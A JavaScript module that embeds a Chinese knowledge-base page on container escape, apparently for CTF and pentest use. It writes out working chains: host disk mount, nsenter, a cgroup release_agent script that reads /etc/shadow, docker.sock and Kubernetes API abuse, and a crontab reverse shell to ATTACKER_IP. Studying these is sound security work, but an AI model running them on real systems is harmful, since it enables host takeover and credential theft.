const n="容器逃逸技术",e="容器逃逸技术",o='已经在容器里（Docker / LXC / K8s Pod），怎么摸到宿主。核心不是"上去就试漏洞"，而是先答两问——**我在什么容器里、我有什么权限**——再照判据表选链。本页第一条要破除的误解：**容器内 root ≠ 宿主 root**（见第八节）。',t=`# 容器逃逸技术

> 已经在容器里（Docker / LXC / K8s Pod），怎么摸到宿主。核心不是"上去就试漏洞"，而是先答两问——**我在什么容器里、我有什么权限**——再照判据表选链。本页第一条要破除的误解：**容器内 root ≠ 宿主 root**（见第八节）。

## 一、0 号动作：先判容器、再判权限

别急着打 CVE。先用两条互相独立的证据确认"我在容器里"，再用一行 \`CapEff\` 定权限档位——**权限档位决定后面能走哪条链**。

\`\`\`bash
#!/bin/bash
# container-enum.sh — 进容器先跑这一遍

# ① 我在容器里吗
cat /proc/1/cgroup 2>/dev/null | grep -qi "docker\\|kubepods\\|containerd" && echo ">> 容器（cgroup 命中）"
ls -la /.dockerenv 2>/dev/null                       # 有这文件基本就是 Docker
grep -i "overlay\\|docker\\|kubelet" /proc/self/mountinfo
hostname                                             # 随机 hex 名 = 多半容器
cat /proc/1/status | head -5                         # PID 1 不是 systemd/init？
ip addr 2>/dev/null | grep -c veth                   # veth 网卡

# ② 什么权限（本页最关键的一行）
grep CapEff /proc/self/status
capsh --print 2>/dev/null

# ③ 有什么现成的逃逸面
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
mount | grep -v "overlay\\|tmpfs\\|proc\\|cgroup"       # 有没有宿主目录被挂进来
fdisk -l 2>/dev/null || lsblk                        # 看得到宿主盘 = 特权
\`\`\`

\`CapEff\` 速读：

| CapEff | 含义 | 能走哪条链 |
|---|---|---|
| \`0000003fffffffff\` | 本质是 \`--privileged\`（老内核写法） | 挂宿主盘 / nsenter（§三） |
| \`000001ffffffffff\` | 新内核下的全特权写法 | 同上 |
| 只有零星几位 | 部分 capabilities | 逐位查 §三 的能力表 |
| \`0000000000000000\` | 无特权 | 走 socket / 挂载 / 内核漏洞 |

**一堆自动化枚举工具**（题目允许落地就优先跑，别手搓）：

| 工具 | 用途 | 命令 |
|---|---|---|
| deepce | Docker 枚举 + 利用建议 | \`./deepce.sh\` |
| CDK | 容器/K8s 一站式渗透 | \`./cdk evaluate\` |
| amicontained | 显示运行时、caps、seccomp | \`./amicontained\` |
| PEIRATES | K8s 渗透 | \`./peirates\` |
| BOtB | 自动逃逸 | \`./botb -autopwn\` |

## 二、判据表：观测到什么 ⇒ 用哪个手法

| 观测到的现象 | 手法 | 关键细节 / 落点 |
|---|---|---|
| \`CapEff\` 全 1（\`--privileged\`） | 挂宿主盘 + chroot，或 nsenter | \`/dev/sda1\`→\`/mnt\`→\`chroot\`（§三） |
| \`--privileged\` 且 \`hostPID: true\` | \`nsenter -t 1\` | 最干净，直接进宿主命名空间 |
| 有 \`CAP_SYS_ADMIN\` + cgroup **v1** | cgroup \`release_agent\` 写命令 | 见 §三，最经典的 cap 逃逸 |
| 有 \`CAP_SYS_ADMIN\` + cgroup v2 | 走 mount / eBPF 路径 | v2 没有 \`release_agent\` |
| 有 \`CAP_SYS_PTRACE\` + 共享 PID ns | ptrace 注入宿主 root 进程 | 需要能看到宿主进程 |
| 有 \`CAP_DAC_READ_SEARCH\` | shocker（\`open_by_handle_at\`） | 读宿主任意文件 |
| 有 \`CAP_NET_ADMIN\` + 共享 net ns | 改路由 / iptables / 流量劫持 | 辅助，不是直取 |
| \`/var/run/docker.sock\` 可读写 | 起特权容器挂宿主根 | 有 CLI 用 CLI，没有用 curl（§四） |
| 挂了 \`/etc\`、\`/root\`、宿主盘 | 直接读写宿主文件 | 写 \`authorized_keys\` / \`crontab\`（§五） |
| \`hostPath: /\`（K8s） | \`chroot /host bash\` | 非特权也能读写节点文件系统 |
| \`runc\` 版本 < 1.0.0-rc6 | CVE-2019-5736 | \`docker exec\` 触发，覆写宿主 runc |
| 内核 cgroup 未打补丁 | CVE-2022-0492 | **无** \`CAP_SYS_ADMIN\` 也能写 release_agent |
| 内核恰在 5.8 ~ 5.16.11 | dirty pipe（CVE-2022-0847） | 覆写只读文件（含宿主挂载的只读文件） |
| 有 SA token 且 RBAC 给 pod/create | 造特权 Pod 逃逸 | 见 §七 |
| 以上都没有 | 跑 deepce/CDK，查网络、查其它容器 | 别死磕，先枚举 |

## 三、特权容器与 capabilities

### 3.1 \`--privileged\`：挂宿主盘 + chroot

\`\`\`bash
grep CapEff /proc/self/status        # 确认 0000003fffffffff / 000001ffffffffff
fdisk -l 2>/dev/null                 # 找宿主盘：/dev/sda1(VM) 或 /dev/nvme0n1p1(云)
mkdir -p /mnt/hostroot && mount /dev/sda1 /mnt/hostroot
chroot /mnt/hostroot bash            # 进来就是宿主 root
cat /mnt/hostroot/etc/shadow         # 直接读
\`\`\`

### 3.2 \`nsenter\`：更干净的一条

\`\`\`bash
ls /proc/1/root/etc/hostname         # 读得到 = 共享了 PID ns 或自己是特权
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
whoami; hostname                     # root / 宿主主机名
\`\`\`

### 3.3 单项 capability 对应的链

| 能力 | 利用 | 说明 |
|---|---|---|
| \`CAP_SYS_ADMIN\` | cgroup \`release_agent\`、\`mount\` | 最万能，容器题里最常见 |
| \`CAP_SYS_PTRACE\` | ptrace 注入宿主 root 进程 | 需 host PID ns 才能看到目标 |
| \`CAP_DAC_READ_SEARCH\` | shocker（\`open_by_handle_at\`） | \`gcc shocker.c -o shocker\` 后读任意文件 |
| \`CAP_NET_ADMIN\` | \`iptables -L\`、\`ip route\` 改宿主网络 | 需共享 network ns |
| \`CAP_SYS_MODULE\` | 加载内核模块 | 极少给，等于直接宿主 root |

### 3.4 cgroup v1 \`release_agent\`（\`CAP_SYS_ADMIN\` 经典链）

cgroup v1 里 root 可写 \`release_agent\` —— 该脚本**由宿主内核以宿主 root 执行**。这就是"容器内写文件、宿主机执行命令"的直通车。

\`\`\`bash
# Step 1 确认 cgroup v1（不是 cgroup2）+ 有 CAP_SYS_ADMIN
mount | grep cgroup                 # 找 "cgroup" 而非 "cgroup2"
grep CapEff /proc/self/status

# Step 2 找可写的 cgroup 挂载点
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null | head -n1))
[ -z "$d" ] && echo "无可用 cgroup，换链" && exit 1

# Step 3-4 建子 cgroup 并打开 release 通知
mkdir -p "$d/escape"
echo 1 > "$d/escape/notify_on_release"

# Step 5 把 release_agent 指向宿主路径下的脚本
host_path=$(sed -n 's/.*\\bperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
[ -z "$host_path" ] && host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > "$d/release_agent"

# Step 6 脚本（注意：它跑在宿主上，路径也按宿主算）
cat > /cmd << 'EOF'
#!/bin/sh
id > /output
cat /etc/shadow >> /output
EOF
chmod +x /cmd

# Step 7-8 触发（把进程放进子 cgroup 再退出即触发 release）
sh -c "echo \\$\\$ > $d/escape/cgroup.procs"
sleep 2
cat /output
\`\`\`

\`perdir=\` 来自 overlayfs 的挂载选项，含义是"容器内这个路径在宿主上对应哪里"——没它就没法把 \`/cmd\` 的宿主路径写给内核。**这是整条链最容易失败的一步**，v2 或非 overlay 存储驱动下要换 \`upperdir=\` 甚至无解。

## 四、docker.sock 与 Docker API

\`/var/run/docker.sock\` 可读写 = 你能指挥宿主上的 Docker daemon = **等于 root**。

**有 CLI 时（最短路径）**：

\`\`\`bash
ls -la /var/run/docker.sock && docker ps
docker run -d --privileged --pid=host -v /:/hostfs --name escape alpine sleep 3600
docker exec -it escape chroot /hostfs bash
\`\`\`

**只有 socket、没有 CLI 时（纯 curl 打 API）**：

\`\`\`bash
# 列镜像（确认 alpine 之类在不在）
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json \\
  | python3 -c "import sys,json;[print(i['RepoTags']) for i in json.load(sys.stdin)]"

# 建特权容器，把宿主 / 挂到 /host
CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \\
  -X POST http://localhost/containers/create -H "Content-Type: application/json" \\
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \\
  | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])")

# 启动 → exec 读宿主 shadow → 清理
curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/\${CONTAINER_ID}/start"
EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \\
  -X POST "http://localhost/containers/\${CONTAINER_ID}/exec" -H "Content-Type: application/json" \\
  -d '{"Cmd":["cat","/host/etc/shadow"],"AttachStdout":true}' \\
  | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])")
curl -s --unix-socket /var/run/docker.sock \\
  -X POST "http://localhost/exec/\${EXEC_ID}/start" -H "Content-Type: application/json" -d '{"Tty":true}'
curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/\${CONTAINER_ID}?force=true"
\`\`\`

> **DinD 陷阱**：\`docker info | grep "Docker Root Dir"\` 看一眼——若指向内层 daemon，socket 打的是**内层**，不是宿主。要找的是宿主的 socket（CI 里常见 \`-v /var/run/docker.sock:/var/run/docker.sock\` 直通，那就是宿主 daemon）。先 \`find / -name docker.sock 2>/dev/null\` 把候选列全。

## 五、挂载了宿主敏感目录

不一定要特权——**只要某次 \`-v\` 把宿主目录挂了进来**，就是一条通道。

\`\`\`bash
mount | grep -v "overlay\\|tmpfs\\|proc\\|cgroup"    # 先看挂了什么
\`\`\`

| 被挂进来的宿主路径 | 直接能做什么 |
|---|---|
| \`/root\`（或宿主某用户家目录） | 写 \`~/.ssh/authorized_keys\`（把公钥追加进去）拿 SSH |
| \`/etc\` | 写 \`/etc/crontab\` 或 \`/etc/cron.d/*\` 定时反弹；读 \`/etc/shadow\` |
| \`/var/run\`（含 docker.sock） | 见 §四 |
| \`/\` 或 \`/host\`（整盘） | \`chroot\` 进宿主，或直接读写任意文件 |
| \`hostPath: /\`（K8s Pod） | 非特权 Pod 也能 \`cat /host/etc/shadow\` |

\`\`\`bash
# 典型：宿主 / 挂在 /host，往宿主 crontab 写一个每分钟反弹
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /host/etc/crontab
# 或写宿主 auth key（公钥是你自己的，不是偷来的）
mkdir -p /host/root/.ssh && cat mykey.pub >> /host/root/.ssh/authorized_keys
\`\`\`

> **注意方向**：宿主机上的 cron/ssh 读的是**宿主路径**，你写文件时要按宿主视角拼路径（比如容器内 \`/host/etc/crontab\` 在宿主上是 \`/etc/crontab\`），写错位置等于白写。

## 六、内核与运行时漏洞

前三节是"配置错"，这节是"版本旧"。**先确认版本再试，别当通用手法。**

| 漏洞 | 影响组件 / 版本 | 触发条件 | 效果 |
|---|---|---|---|
| CVE-2019-5736 | runc < 1.0.0-rc6 | 容器内 \`/bin/sh\` 被换成利用程序，宿主**下次 \`docker exec\`** 时触发 | 覆写宿主 \`/usr/bin/runc\`，**一次性**，之后所有容器都中招 |
| CVE-2020-15257 | containerd < 1.3.9 / < 1.4.3 | 容器共享宿主 network ns | 连宿主抽象 socket \`@/containerd-shim/*.sock\` 打 shim API |
| CVE-2022-0492 | 未打补丁的 cgroup v1 内核 | 容器内用户可写 cgroup | **无需** \`CAP_SYS_ADMIN\` 即可写 \`release_agent\`（即 §3.4 的低权限版） |
| dirty pipe | CVE-2022-0847，内核 5.8 ~ 5.16.11 | 本地 | 覆写**只读**文件（如 \`/etc/passwd\`、宿主挂载进来的只读文件），提权/越权写 |

\`\`\`bash
uname -a
cat /etc/os-release
cat /proc/sys/kernel/unprivileged_bpf_disabled   # 0 = 无特权也能用 eBPF（v2 环境下的另一条路）
\`\`\`

**eBPF 路径**：cgroup **v2** 没有 \`release_agent\`，但若内核 ≥ 5.8 且允许非特权 eBPF（上面那个值 = 0）+ 有 \`CAP_SYS_ADMIN\`，可用 eBPF 程序在宿主语境执行。比 v1 链复杂，是"v1 走不通时"的备选。

## 七、K8s Pod：SA token 与 API

Pod 里默认挂着一个 Service Account token，**它就是一把能打 kube-apiserver 的钥匙**——权限多大全看 RBAC。

\`\`\`bash
ls /var/run/secrets/kubernetes.io/serviceaccount/     # token / ca.crt / namespace
cat /etc/hostname                                     # Pod 名格式
\`\`\`

\`\`\`bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://kubernetes.default.svc"

# ① 我这把 token 能干什么？（先问再打）
curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \\
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\
  -d "{\\"apiVersion\\":\\"authorization.k8s.io/v1\\",\\"kind\\":\\"SelfSubjectRulesReview\\",\\"spec\\":{\\"namespace\\":\\"$NS\\"}}"
\`\`\`

**若 RBAC 给了 \`pods/create\`**，直接造一个逃逸 Pod（\`hostPID\` + \`hostNetwork\` + \`privileged\` + \`hostPath: /\`，一次全给）：

\`\`\`bash
curl -sk "$API/api/v1/namespaces/$NS/pods" \\
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\
  -d '{
    "apiVersion":"v1","kind":"Pod",
    "metadata":{"name":"escape-pod"},
    "spec":{
      "hostPID":true,"hostNetwork":true,
      "containers":[{
        "name":"escape","image":"alpine",
        "command":["/bin/sh","-c","nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c \\"cat /etc/shadow > /tmp/shadow\\"; sleep 3600"],
        "securityContext":{"privileged":true},
        "volumeMounts":[{"name":"hostfs","mountPath":"/host"}]
      }],
      "volumes":[{"name":"hostfs","hostPath":{"path":"/"}}]
    }
  }'
\`\`\`

**Pod spec 里直接给逃逸面的字段**：

| 危险字段 | 逃逸方式 |
|---|---|
| \`hostPID: true\` | \`nsenter -t 1 -m -u -i -n -p -- bash\`；或读 \`/proc/1/root/etc/shadow\` |
| \`hostNetwork: true\` | 直达节点服务（kubelet 10250、etcd 2379） |
| \`privileged: true\` | 挂宿主盘 / nsenter（同 §三） |
| \`hostPath: {path: /}\` | 读写节点文件系统（**非特权也成立**） |
| SA token + 宽松 RBAC | 建特权 Pod（本节上半） |

拿到节点后：\`/var/lib/kubelet/config.yaml\`（kubelet 配置）、\`/etc/kubernetes/pki/\`（集群证书）。

## 八、澄清：容器内 root ≠ 宿主 root

这是本页最常被误解、也最容易在题里踩坑的一点，单独说清：

- **容器的 root 由 user namespace / capabilities 界定，不是"宿主 root 换了个名字"**。默认 Docker 下，容器内 UID 0 只在容器自己的 user ns 里是 0；一旦你 \`mount\` 宿主文件系统或 \`nsenter\` 进宿主 ns，**你带去的是宿主语境下的权限**——所以能不能逃逸，取决于 caps/特权，而不是"我 \`whoami\` 是不是 root"。
- **推论一**：\`whoami\` = root **不代表**能读宿主 \`/etc/shadow\`。默认容器里你就是 root，照样摸不到宿主。
- **推论二**：容器里**不是** root 也可能逃逸——只要 socket 可写、宿主目录被挂进来、或内核有洞（如 CVE-2022-0492）。
- **推论三**：容器内提权到 root（走 [[杂项-Linux本地提权]] 的 SUID/sudo/capabilities）往往是**逃逸的前置步骤**，不是终点；拿 root 是为了获得打逃逸链所需的 capability。
- **一句话判据**：不要问"我是不是 root"，要问"**我有没有 CAP_SYS_ADMIN / socket / 宿主挂载 / 老内核**"。

## 关键点

- **先判权限，再选手法**：\`grep CapEff /proc/self/status\` 是分水岭——全 1 直接挂盘/nsenter，稀疏就走 socket/挂载/内核。
- \`docker.sock\` 可写 = 宿主 root，不要绕远路。有 CLI 三条命令解决，没 CLI 用 §四 的 curl 五步。
- **挂载点是被忽视的直通车**：\`mount | grep -v overlay\` 看有没有宿主目录进来，比找漏洞快得多。
- \`CAP_SYS_ADMIN\` + cgroup **v1** = \`release_agent\` 逃逸；v2 没这个文件，要么换 mount/eBPF，要么放弃这条链。
- 内核漏洞**先对版本**：CVE-2019-5736 要 runc < rc6 且**依赖下次 \`docker exec\`**（一次性）；CVE-2022-0492 要 cgroup v1 未打补丁；dirty pipe 要内核 5.8~5.16.11。
- K8s 里**先 \`SelfSubjectRulesReview\` 问权限再动手**，token 的权限全看 RBAC，别假设它能建 Pod。
- Pod 的 \`hostPID\`/\`hostPath: /\`/\`privileged\` 三个字段任一命中就有逃逸面，\`hostPath\` 连非特权都成立。
- **容器内 root ≠ 宿主 root**：判据是 capability 与挂载，不是 \`whoami\`。
- 逃逸链常是**多跳**：内层容器 → DinD → 宿主，先搞清"我现在这层是谁的 socket / 谁的挂载"。
- 落地优先跑自动化（deepce / CDK / amicontained），手搓枚举容易漏面。

## 关联

- [[杂项-Linux本地提权]] —— 容器内提权到 root 是本页多数链的前置；那页的 capabilities 表与本页 §三 互补，两页一上一下。
- [[Docker-Registry与远程API利用]] —— docker.sock 的"远端版"：暴露在 2375 端口的 Docker API 与本地 socket 是同一条链的两端。
- [[云安全-常见攻击面]] —— 逃逸到宿主/节点之后接的就是云面（元数据、IAM 凭证、横向），本页是它的前置一跳。
- [[云安全-AWS渗透实战]] —— 从容器里拿到宿主后，常顺手掏 EC2 元数据 / IAM 角色，接这页继续打云。
- [[Pwn-内核利用]] —— CVE-2022-0492、dirty pipe 属于内核漏洞，本页只给"何时用"，利用细节在那页。
- [[杂项-BashJail与受限Shell]] —— 应用层受限 shell 的逃逸，与本页"系统层跳出容器"是两种不同的"跳出限制"，别混。

## 存疑 / 矛盾

- ⚠️ **本页未逐条上机实测**：全部内容提炼自 container-escape-techniques 技能文档，命令骨架按文档整理，**具体路径/版本号/参数随目标环境而变**，以目标机的实际 \`mount\`、\`CapEff\`、版本输出为准。
- ⚠️ **\`CapEff\` 的常量随内核版本漂移**：\`0000003fffffffff\` 是老写法，新内核上全特权是 \`000001ffffffffff\`，还可能因内核新增 capability 而改变位数——**别硬编码比对，用 \`capsh --print\` 看语义**。
- ⚠️ **cgroup \`release_agent\` 链对存储驱动/挂载选项敏感**：\`perdir=\`/\`upperdir=\` 的解析依赖 overlayfs，换驱动（如 devicemapper、btrfs）或 cgroup v2 下会直接失效；这条链"文档里能跑"不等于"目标上能跑"。
- ⚠️ **CVE 依赖精确版本且需未打补丁**：runc/containerd 补丁早已广泛部署，实战/比赛里遇到老版本的概率不高；先 \`runc --version\` / 看镜像时间，别默认有洞。
- ⚠️ **与 [[杂项-Linux本地提权]] 第七节重叠**：那页的 docker 组 / docker.sock / 特权容器三小节与本页 §三、§四 讲的是同一批手法，只是一个从"主机视角"讲、一个从"容器内视角"讲——遇到内容不一致时以**目标机实测**为准。
- ⚠️ **K8s 逃逸的 token 权限是变量**：默认 SA token 在多数集群里权限极小，\`pods/create\` 需明确 RBAC 授权；现代集群还普遍启用 token 自动挂载关闭（\`automountServiceAccountToken: false\`）与 PSA/Pod Security Admission 限制 \`privileged\`，§七 的 Pod spec 在新集群上可能直接被 admission 拒掉。
- ⚠️ **dirty pipe 与"逃逸"的边界**：CVE-2022-0847 本身是内核本地提权/越权写，在容器里能否达成"逃逸到宿主"取决于它能否写到宿主可见的只读挂载文件，是**条件性**的逃逸面，不宜一概写成"容器逃逸利用"。
- ⚠️ 文中"挂 SSH key / 写 crontab"的持久化示例是**方法演示**，路径与宿主视角的换算必须实地确认；不要照抄路径，也不要写入任何真实私钥。

## 来源

- 糯米内建知识整理 · 2026-10-05，提炼自 container-escape-techniques/SKILL.md 技能文档（正文未逐条上机实测，边界见「存疑 / 矛盾」）
- [SKILL 原文](../../01-原料/收藏/技能文档/container-escape-techniques/SKILL.md) —— 2026-10-05 归档进库
- [SKILL 原文](../../01-原料/收藏/技能文档/container-escape-techniques/DOCKER_ESCAPE_CHAINS.md) —— 2026-10-05 归档进库
`,s="concept",r="other",c={internal:["Docker-Registry与远程API利用","Pwn-内核利用","云安全-AWS渗透实战","云安全-常见攻击面","杂项-BashJail与受限Shell","杂项-Linux本地提权"],unresolvedCount:0},a={name:n,title:e,summary:o,content:t,section:s,group:r,links:c};export{t as content,a as default,r as group,c as links,n as name,s as section,o as summary,e as title};
